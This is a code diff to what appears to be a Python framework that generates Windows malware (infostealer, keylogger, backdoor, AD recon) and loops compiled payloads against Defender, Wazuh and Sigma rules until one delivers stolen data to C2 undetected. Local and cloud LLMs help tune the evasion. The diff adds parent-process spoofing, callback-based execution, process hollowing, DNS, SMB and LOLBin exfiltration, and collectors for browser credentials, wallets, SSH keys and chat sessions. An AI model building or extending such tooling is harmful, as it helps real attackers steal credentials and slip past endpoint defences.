@@ -42,8 +42,12 @@ LAYERS = {
             "threaded":      {"risk": "medium", "desc": "Each collector in its own thread"},
             "staged":        {"risk": "low",    "desc": "Staged execution with jitter between ops"},
             "fiber":         {"risk": "low",    "desc": "Fiber-based scheduling"},
-            "callback_abuse":{"risk": "vlow",   "desc": "EnumWindows/timer callbacks as execution vehicle"},
-            "apc_self":      {"risk": "vlow",   "desc": "QueueUserAPC to own thread"},
+            "callback_abuse":       {"risk": "vlow",   "desc": "Timer queue callbacks as execution vehicle"},
+            "callback_enumwindows": {"risk": "low",    "desc": "EnumWindows callback vehicle"},
+            "callback_certenumsystem":{"risk": "vlow", "desc": "CertEnumSystemStore callback — looks like cert management"},
+            "callback_copyfile2":   {"risk": "vlow",   "desc": "CopyFile2 progress callback — looks like file operation"},
+            "callback_enumrestype": {"risk": "vlow",   "desc": "EnumResourceTypes callback — minimal footprint"},
+            "apc_self":             {"risk": "vlow",   "desc": "QueueUserAPC to own thread"},
         },
         "default": "sequential",
     },
@@ -51,7 +55,12 @@ LAYERS = {
         "description": "Binary structure and process lineage",
         "options": {
             "standalone":     {"risk": "medium", "desc": "Normal standalone exe"},
-            "ppid_spoof":     {"risk": "low",    "desc": "Spoofed parent process (explorer.exe)"},
+            "ppid_spoof":              {"risk": "low",  "desc": "Spoofed parent process (explorer.exe)"},
+            "ppid_spoof_svchost":      {"risk": "low",  "desc": "Spoofed parent (svchost.exe)"},
+            "ppid_spoof_runtimebroker": {"risk": "vlow", "desc": "Spoofed parent (RuntimeBroker.exe)"},
+            "ppid_spoof_sihost":       {"risk": "vlow", "desc": "Spoofed parent (sihost.exe)"},
+            "ppid_spoof_taskhostw":     {"risk": "vlow", "desc": "Spoofed parent (taskhostw.exe)"},
+            "ppid_spoof_dllhost":      {"risk": "vlow", "desc": "Spoofed parent (dllhost.exe — COM surrogate)"},
             "dll_sideload":   {"risk": "vlow",   "desc": "Proxy DLL loaded by signed MS binary"},
             "process_hollow": {"risk": "vlow",   "desc": "Hollowed legitimate process"},
         },
@@ -92,9 +101,22 @@ LAYERS = {
     "exfil": {
         "description": "Data exfiltration method",
         "options": {
-            "tcp_direct": {"risk": "high",   "desc": "Raw TCP socket connection"},
-            "http_post":  {"risk": "medium", "desc": "HTTP POST (looks like web traffic)"},
-            "dns_exfil":  {"risk": "vlow",   "desc": "DNS TXT record queries"},
+            "tcp_direct":        {"risk": "high",   "desc": "Raw TCP socket connection"},
+            "http_post":         {"risk": "medium", "desc": "HTTP POST (looks like web traffic)"},
+            "https_post":        {"risk": "low",    "desc": "HTTPS POST to port 443 — blends with web traffic"},
+            "winhttp_get":       {"risk": "low",    "desc": "HTTP GET with encoded params — looks like browsing"},
+            "winhttp_api":       {"risk": "low",    "desc": "WinHTTP API — looks like software update check"},
+            "dns_exfil":         {"risk": "vlow",   "desc": "DNS TXT record queries"},
+            "dns_txt":           {"risk": "vlow",   "desc": "DNS TXT queries with base32 encoding"},
+            "smb_write":         {"risk": "low",    "desc": "SMB file write — blends with file server traffic"},
+            "http_get_chunks":   {"risk": "low",    "desc": "Hex in GET params — looks like API polling"},
+            "named_pipe":        {"risk": "low",    "desc": "Named pipe — no network footprint"},
+            "certutil_lolbin":   {"risk": "medium", "desc": "certutil -encode + certutil -urlcache — LOLBin"},
+            "bitsadmin_lolbin":  {"risk": "medium", "desc": "BITSAdmin transfer job — LOLBin"},
+            "powershell_lolbin": {"risk": "medium", "desc": "Invoke-WebRequest — LOLBin"},
+            "cscript_lolbin":    {"risk": "medium", "desc": "cscript WScript.Shell — LOLBin"},
+            "mshta_lolbin":      {"risk": "medium", "desc": "mshta javascript — LOLBin"},
+            "curl_lolbin":       {"risk": "medium", "desc": "curl.exe POST — LOLBin"},
         },
         "default": "tcp_direct",
     },
@@ -126,8 +148,8 @@ DETECTION_RULES = [
         "desc": "Behavioral detection — EDR saw suspicious action sequence",
         "changes": {
             "timing": {"avoid": ["immediate", "staged_jitter"], "prefer": ["deferred", "triggered"]},
-            "execution": {"avoid": ["sequential", "threaded"], "prefer": ["callback_abuse", "fiber"]},
-            "process": {"avoid": ["standalone"], "prefer": ["ppid_spoof", "dll_sideload"]},
+            "execution": {"avoid": ["sequential", "threaded"], "prefer": ["callback_abuse", "callback_enumwindows", "callback_certenumsystem", "callback_copyfile2", "callback_enumrestype", "fiber"]},
+            "process": {"avoid": ["standalone"], "prefer": ["ppid_spoof_svchost", "ppid_spoof_runtimebroker", "ppid_spoof_sihost", "ppid_spoof_dllhost", "dll_sideload"]},
         },
     },
     {
@@ -151,7 +173,7 @@ DETECTION_RULES = [
         "desc": "Password stealer detection — credential access behavior flagged",
         "changes": {
             "timing": {"avoid": ["immediate"], "prefer": ["triggered", "deferred"]},
-            "exfil": {"avoid": ["tcp_direct"], "prefer": ["dns_exfil", "http_post"]},
+            "exfil": {"avoid": ["tcp_direct"], "prefer": ["dns_txt", "https_post", "smb_write", "dns_exfil"]},
             "process": {"avoid": ["standalone"], "prefer": ["dll_sideload", "process_hollow"]},
         },
     },
@@ -167,7 +189,7 @@ DETECTION_RULES = [
         "desc": "Keylogger-specific detection",
         "changes": {
             "api_resolve": {"avoid": ["direct_import"], "prefer": ["peb_walk", "indirect_syscall"]},
-            "execution": {"avoid": ["sequential"], "prefer": ["callback_abuse"]},
+            "execution": {"avoid": ["sequential"], "prefer": ["callback_abuse", "callback_enumwindows", "callback_certenumsystem"]},
             "anti_analysis": {"avoid": ["none"], "prefer": ["anti_sandbox", "full"]},
         },
     },
@@ -175,14 +197,14 @@ DETECTION_RULES = [
         "signals": ["Suspicious:Process", "SuspiciousParent"],
         "desc": "Process lineage flagged — suspicious parent or creation method",
         "changes": {
-            "process": {"avoid": ["standalone", "ppid_spoof"], "prefer": ["dll_sideload", "process_hollow"]},
+            "process": {"avoid": ["standalone", "ppid_spoof"], "prefer": ["ppid_spoof_taskhostw", "ppid_spoof_dllhost", "ppid_spoof_sihost", "dll_sideload", "process_hollow"]},
         },
     },
     {
         "signals": ["ConnectionToC2", "SuspiciousNetwork", "Beacon"],
         "desc": "Network behavior flagged — C2 pattern detected",
         "changes": {
-            "exfil": {"avoid": ["tcp_direct"], "prefer": ["dns_exfil"]},
+            "exfil": {"avoid": ["tcp_direct", "http_post"], "prefer": ["dns_txt", "dns_exfil", "smb_write"]},
             "timing": {"avoid": ["immediate"], "prefer": ["workday", "triggered"]},
         },
     },
@@ -426,19 +448,30 @@ def record_run(config, detected, detection_text="", success=False):
 
 def config_to_recipe(config, malware_type="infostealer", collectors=None):
     """Convert a layer config to a recipe YAML string."""
+    is_ad_recon = malware_type == "ad_recon"
     if collectors is None:
         if malware_type == "infostealer":
             collectors = [
                 "collectors/system_info",
                 "collectors/processes",
-                "collectors/env_vars",
-                "collectors/wifi_passwords",
                 "collectors/browser_chromium",
-                "collectors/discord_tokens",
-                "collectors/ssh_keys",
+                "collectors/screenshot",
+                "collectors/env_vars",
+                "collectors/netinfo_api",
+                "collectors/installed_software",
+                "collectors/recent_files",
                 "collectors/cloud_creds",
                 "collectors/crypto_wallets",
-                "collectors/screenshot",
+                "collectors/ssh_keys",
+                "collectors/discord_tokens",
+                "collectors/ftp_credentials",
+                "collectors/startup_items",
+                "collectors/security_products",
+                "collectors/drives",
+                "collectors/scheduled_tasks_recon",
+                "collectors/clipboard",
+                "collectors/active_windows",
+                "collectors/telegram_session",
             ]
         elif malware_type == "keylogger":
             collectors = [
@@ -447,6 +480,14 @@ def config_to_recipe(config, malware_type="infostealer", collectors=None):
             ]
         elif malware_type == "backdoor":
             collectors = None
+        elif malware_type == "ad_recon":
+            collectors = [
+                "ad_collectors/ad_users",
+                "ad_collectors/ad_groups",
+                "ad_collectors/ad_computers",
+                "ad_collectors/ad_ous",
+                "ad_collectors/ad_gpos",
+            ]
         else:
             collectors = ["collectors/system_info"]
 
@@ -457,13 +498,30 @@ def config_to_recipe(config, malware_type="infostealer", collectors=None):
         "staged": "arch/staged",
         "fiber": "arch/fiber",
         "callback_abuse": "arch/callback_abuse",
+        "callback_enumwindows": "arch/callback_enumwindows",
+        "callback_certenumsystem": "arch/callback_certenumsystem",
+        "callback_copyfile2": "arch/callback_copyfile2",
+        "callback_enumrestype": "arch/callback_enumrestype",
         "apc_self": "arch/apc_self",
     }
 
     exfil_map = {
-        "tcp_direct": "exfil/tcp_direct",
-        "http_post": "exfil/http_post",
-        "dns_exfil": "exfil/dns_exfil",
+        "tcp_direct":        "exfil/tcp_direct",
+        "http_post":         "exfil/http_post",
+        "https_post":        "exfil/https_post",
+        "winhttp_get":       "exfil/winhttp_get",
+        "winhttp_api":       "exfil/winhttp_api",
+        "dns_exfil":         "exfil/dns_exfil",
+        "dns_txt":           "exfil/dns_txt",
+        "smb_write":         "exfil/smb_write",
+        "http_get_chunks":   "exfil/http_get_chunks",
+        "named_pipe":        "exfil/named_pipe",
+        "certutil_lolbin":   "exfil/certutil_lolbin",
+        "bitsadmin_lolbin":  "exfil/bitsadmin_lolbin",
+        "powershell_lolbin": "exfil/powershell_lolbin",
+        "cscript_lolbin":    "exfil/cscript_lolbin",
+        "mshta_lolbin":      "exfil/mshta_lolbin",
+        "curl_lolbin":       "exfil/curl_lolbin",
     }
 
     timing_map = {
@@ -504,21 +562,43 @@ def config_to_recipe(config, malware_type="infostealer", collectors=None):
 
     # Map process options to actual chunk paths
     process_map = {
-        "ppid_spoof":     "process/ppid_spoof",
+        "ppid_spoof":              "process/ppid_spoof",
+        "ppid_spoof_svchost":      "process/ppid_spoof_svchost",
+        "ppid_spoof_runtimebroker": "process/ppid_spoof_runtimebroker",
+        "ppid_spoof_sihost":       "process/ppid_spoof_sihost",
+        "ppid_spoof_taskhostw":    "process/ppid_spoof_taskhostw",
+        "ppid_spoof_dllhost":      "process/ppid_spoof_dllhost",
         "dll_sideload":   "process/ppid_spoof",
         "process_hollow": "process/ppid_spoof",
     }
 
-    lines = [
-        f"name: {malware_type}_adaptive",
-        f"description: Adaptive {malware_type} — layers selected by evasion_selector",
-        "",
-        "core:",
-        "  - core/emit_buffer",
-        "  - core/run_cmd",
-        "  - core/file_ops",
-        "",
-    ]
+    if is_ad_recon:
+        lines = [
+            f"name: {malware_type}_adaptive",
+            f"description: Adaptive AD recon — layers selected by evasion_selector",
+            "",
+            "core:",
+            "  - ad/json_builder",
+            "  - ad/ldap_client",
+            "  - ad/sid_resolver",
+            "  - ad_collectors/ad_domains",
+            "",
+        ]
+        lines.append("collectors:")
+        for c in collectors:
+            lines.append(f"  - {c}")
+        lines.extend(["", "arch: arch/ad_recon"])
+    else:
+        lines = [
+            f"name: {malware_type}_adaptive",
+            f"description: Adaptive {malware_type} — layers selected by evasion_selector",
+            "",
+            "core:",
+            "  - core/emit_buffer",
+            "  - core/run_cmd",
+            "  - core/file_ops",
+            "",
+        ]
 
     if malware_type == "backdoor":
         c2_transport = config.get("exfil", "tcp_direct")
@@ -536,7 +616,7 @@ def config_to_recipe(config, malware_type="infostealer", collectors=None):
         lines.append("  - commands/cmd_netinfo")
         lines.append("")
         lines.append("arch: arch/backdoor")
-    else:
+    elif not is_ad_recon:
         lines.append("collectors:")
         for c in collectors:
             lines.append(f"  - {c}")
@@ -594,6 +674,13 @@ def config_to_recipe(config, malware_type="infostealer", collectors=None):
         '  C2_IP: "10.0.2.2"',
         '  C2_PORT: "9001"',
     ])
+
+    if is_ad_recon:
+        lines.extend([
+            '  LDAP_USER: "it.admin"',
+            '  LDAP_DOMAIN: "MALWARE"',
+            '  LDAP_PASS: "Adm1nP@ss!"',
+        ])
 
     return "\n".join(lines)
 
@@ -680,12 +767,21 @@ AV_DETECTION_CMDS = {
 }
 
 
-def get_detection_cmd():
+def get_active_edrs():
+    edrs_str = os.environ.get("MALGEN_ACTIVE_EDRS", "")
+    if edrs_str:
+        return [e.strip() for e in edrs_str.split(",") if e.strip()]
     av_type = os.environ.get("MALGEN_AV_TYPE", "defender")
-    custom = os.environ.get("MALGEN_DETECTION_CMD", "")
-    if custom:
-        return custom
-    return AV_DETECTION_CMDS.get(av_type, AV_DETECTION_CMDS["defender"])
+    return [av_type]
+
+
+def get_detection_cmd():
+    edrs = get_active_edrs()
+    cmds = []
+    for edr in edrs:
+        if edr in AV_DETECTION_CMDS:
+            cmds.append(AV_DETECTION_CMDS[edr])
+    return " && ".join(cmds) if cmds else AV_DETECTION_CMDS["defender"]
 
 
 def check_wazuh_indexer(minutes=3, min_level=8):
@@ -732,6 +828,75 @@ def check_wazuh_indexer(minutes=3, min_level=8):
         return ""
 
 
+def check_sigma_rules(vm_port=10022, vm_user="vmuser", vm_pass="vmuser123", minutes=3):
+    """Pull Sysmon EVTX from VM, run Chainsaw with full Sigma rules. Return detection text."""
+    import subprocess as _sp
+    import tempfile
+    import json as _json
+
+    project_dir = str(Path(__file__).parent.parent.parent)
+    chainsaw = f"{project_dir}/tools/chainsaw/chainsaw"
+    if not Path(chainsaw).exists():
+        return ""
+
+    sigma_dirs = [
+        f"{project_dir}/tools/sigma/rules/windows",
+        f"{project_dir}/tools/sigma/rules-threat-hunting/windows",
+        f"{project_dir}/tools/sigma/rules-emerging-threats",
+        f"{project_dir}/tools/sigma/rules/custom",
+    ]
+    mappings = f"{project_dir}/tools/chainsaw/mappings/sigma-event-logs-all.yml"
+
+    ssh = f"sshpass -p '{vm_pass}' ssh -o StrictHostKeyChecking=no -p {vm_port} {vm_user}@localhost"
+    scp = f"sshpass -p '{vm_pass}' scp -o StrictHostKeyChecking=no -P {vm_port}"
+
+    with tempfile.TemporaryDirectory() as tmpdir:
+        evtx_local = f"{tmpdir}/sysmon.evtx"
+        evtx_remote = r"C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx"
+
+        # Export recent Sysmon events via wevtutil
+        _sp.run(f"""{ssh} 'wevtutil epl "Microsoft-Windows-Sysmon/Operational" C:\\Users\\{vm_user}\\Desktop\\sysmon_export.evtx /ow:true'""",
+                shell=True, capture_output=True, timeout=30)
+        r = _sp.run(f"""{scp} {vm_user}@localhost:'C:\\Users\\{vm_user}\\Desktop\\sysmon_export.evtx' {evtx_local}""",
+                    shell=True, capture_output=True, timeout=30)
+        _sp.run(f"""{ssh} 'del C:\\Users\\{vm_user}\\Desktop\\sysmon_export.evtx 2>NUL'""",
+                shell=True, capture_output=True)
+
+        if r.returncode != 0 or not Path(evtx_local).exists():
+            return ""
+
+        cmd = [chainsaw, "hunt", evtx_local]
+        for sd in sigma_dirs:
+            if Path(sd).exists():
+                cmd.extend(["-s", sd])
+        cmd.extend(["--mapping", mappings, "--skip-errors", "--json"])
+
+        result = _sp.run(cmd, capture_output=True, text=True, timeout=120)
+        if result.returncode != 0:
+            return ""
+
+        try:
+            detections = _json.loads(result.stdout) if result.stdout.strip() else []
+        except _json.JSONDecodeError:
+            return ""
+
+        if not detections:
+            return ""
+
+        # Filter to recent events and medium+ severity
+        alerts = []
+        for d in detections:
+            level = d.get("level", "").lower()
+            if level in ("critical", "high", "medium"):
+                name = d.get("name", d.get("title", "?"))[:80]
+                sigma_level = level.upper()
+                alerts.append(f"SIGMA {sigma_level}: {name}")
+
+        if not alerts:
+            return ""
+        return "\n".join(alerts[:10])
+
+
 def run_hybrid_loop(
     malware_type="infostealer",
     c2_ip="10.0.2.2",
@@ -764,8 +929,27 @@ def run_hybrid_loop(
     results_log = []
 
     print(f"\n  Hybrid Evasion Loop: {malware_type}", flush=True)
-    print(f"  Tiers: {max_algorithmic} algorithmic + {max_llm} local LLM + {max_cloud} cloud = {max_total} max", flush=True)
-    print(f"  LLM: {llm_url}", flush=True)
+    tiers = []
+    if max_algorithmic: tiers.append(("T1:Algo", max_algorithmic))
+    if max_llm: tiers.append(("T2:Local", max_llm))
+    if max_cloud: tiers.append(("T3:Cloud", max_cloud))
+    tier_strs = [f"{name} ({n})" for name, n in tiers]
+    print(f"  {' > '.join(tier_strs)}  [{max_total} max]", flush=True)
+
+    def _tier_progress(run_num, result_char=None):
+        parts = []
+        run_offset = 0
+        for name, count in tiers:
+            done = max(0, min(count, run_num - 1 - run_offset))
+            w = min(count, 20)
+            filled = done * w // count if count else 0
+            bar = "#" * filled + "-" * (w - filled)
+            parts.append(f"  {name} [{bar}] {done}/{count}")
+            run_offset += count
+        print("\n".join(parts), flush=True)
+
+    _tier_progress(1)
+    print(flush=True)
 
     subprocess.run(f"fuser -k {c2_port}/tcp", shell=True, capture_output=True)
     time.sleep(0.5)
@@ -812,17 +996,12 @@ def run_hybrid_loop(
                         break
 
         # ── Progress bar ──
-        pct = run_num * 100 // max_total
-        bar_filled = run_num * 30 // max_total
-        bar = "#" * bar_filled + "-" * (30 - bar_filled)
-        # Run history icons: S=success, X=detected, E=compile/assemble error, ?=no c2
-        run_icons = ""
-        for r in results_log:
-            run_icons += r
         print(f"\n{'='*60}", flush=True)
-        print(f"  [{bar}] {pct:3d}%  Run {run_num}/{max_total}  {tier_label}", flush=True)
+        _tier_progress(run_num)
+        run_icons = "".join(results_log)
         if run_icons:
-            print(f"  History: {run_icons}", flush=True)
+            print(f"  Runs: {run_icons}", flush=True)
+        print(f"  Run {run_num}/{max_total}  {tier_label}", flush=True)
         print(f"{'='*60}", flush=True)
         print(format_selection_report(config), flush=True)
 
@@ -880,6 +1059,7 @@ def run_hybrid_loop(
             ["x86_64-w64-mingw32-gcc", "-mwindows", "-o", exe_path, src_path,
              "-lws2_32", "-liphlpapi", "-lcrypt32", "-lole32", "-lshell32", "-lgdi32",
              "-lwininet", "-lwinhttp", "-ldnsapi", "-ladvapi32", "-luser32",
+             "-lwldap32", "-lnetapi32",
              "-static", "-s", "-Wl,--strip-all"],
             capture_output=True, text=True)
         os.unlink(src_path)
@@ -953,11 +1133,19 @@ def run_hybrid_loop(
                            shell=True, capture_output=True)
             subprocess.run(f"{ssh} 'schtasks /run /tn evasion_test'",
                            shell=True, capture_output=True)
+        elif malware_type == "infostealer":
+            subprocess.run(f"""{ssh} 'schtasks /create /tn evasion_test /tr """
+                           f""""C:\\Users\\{vm_user}\\Desktop\\payload.exe" """
+                           f"""/sc once /st 00:00 /f """
+                           f"""/ru "MALWARE\\it.admin" /rp "Adm1nP@ss!"'""",
+                           shell=True, capture_output=True)
+            subprocess.run(f"{ssh} 'schtasks /run /tn evasion_test'",
+                           shell=True, capture_output=True)
         else:
             subprocess.Popen(f"{ssh} 'cmd /c \"C:\\Users\\{vm_user}\\Desktop\\payload.exe\"'",
                              shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         listener.wait()
-        if malware_type == "keylogger":
+        if malware_type in ("keylogger", "infostealer"):
             subprocess.run(f"{ssh} 'schtasks /delete /tn evasion_test /f'",
                            shell=True, capture_output=True)
         os.unlink(exe_path)
@@ -970,8 +1158,10 @@ def run_hybrid_loop(
         subprocess.run(f"{ssh} 'del \"C:\\Users\\{vm_user}\\Desktop\\payload.exe\" 2>NUL'",
                        shell=True, capture_output=True)
         wazuh_det = check_wazuh_indexer(minutes=3, min_level=8)
+        print(f" checking Sigma...", end="", flush=True)
+        sigma_det = check_sigma_rules(vm_port=vm_port, vm_user=vm_user, vm_pass=vm_pass)
         c2_threshold = 4 if malware_type == "backdoor" else 100
-        if c2_size > c2_threshold and not wazuh_det:
+        if c2_size > c2_threshold and not wazuh_det and not sigma_det:
             print(f" SUCCESS ({c2_size:,} bytes)", flush=True)
             record_run(config, detected=False, success=True)
             if os.path.exists(c2_out):
@@ -979,10 +1169,10 @@ def run_hybrid_loop(
             results_log.append("S")
             # ── Final success summary ──
             print(f"\n{'='*60}", flush=True)
-            bar = "#" * 30
-            print(f"  [{bar}] SUCCESS on run {run_num}/{max_total}", flush=True)
-            print(f"  Defender: 0 | Wazuh: 0 high | C2: {c2_size:,} bytes", flush=True)
-            print(f"  History: {''.join(results_log)}", flush=True)
+            _tier_progress(run_num + 1)
+            print(f"  SUCCESS on run {run_num}/{max_total}", flush=True)
+            print(f"  Defender: 0 | Wazuh: 0 high | Sigma: 0 med+ | C2: {c2_size:,} bytes", flush=True)
+            print(f"  Runs: {''.join(results_log)}", flush=True)
             print(f"{'='*60}", flush=True)
             return True, config, run_num, load_history()
         else:
@@ -992,8 +1182,13 @@ def run_hybrid_loop(
             det_text = det.stdout.strip()
             if wazuh_det:
                 det_text = f"{det_text}\n{wazuh_det}" if det_text else wazuh_det
+            if sigma_det:
+                det_text = f"{det_text}\n{sigma_det}" if det_text else sigma_det
             detected = bool(det_text)
-            if wazuh_det:
+            if sigma_det:
+                print(f" SIGMA ALERT\n    {sigma_det[:200]}", flush=True)
+                results_log.append("R")
+            elif wazuh_det:
                 print(f" WAZUH ALERT\n    {wazuh_det[:200]}", flush=True)
                 results_log.append("W")
             elif detected:
@@ -1009,15 +1204,17 @@ def run_hybrid_loop(
 
     # ── Final failure summary ──
     print(f"\n{'='*60}", flush=True)
+    _tier_progress(max_total + 1)
     print(f"  FAILED after {max_total} runs", flush=True)
-    print(f"  History: {''.join(results_log)}", flush=True)
-    counts = {"S": 0, "X": 0, "E": 0, "?": 0, "D": 0, "W": 0}
+    print(f"  Runs: {''.join(results_log)}", flush=True)
+    counts = {"S": 0, "X": 0, "E": 0, "?": 0, "D": 0, "W": 0, "R": 0}
     for r in results_log:
         counts[r] = counts.get(r, 0) + 1
     parts = []
     if counts["S"]: parts.append(f"{counts['S']} success")
     if counts["X"]: parts.append(f"{counts['X']} detected (Defender)")
     if counts["W"]: parts.append(f"{counts['W']} detected (Wazuh)")
+    if counts["R"]: parts.append(f"{counts['R']} detected (Sigma)")
     if counts["E"]: parts.append(f"{counts['E']} build error")
     if counts["?"]: parts.append(f"{counts['?']} no C2 data")
     if parts:
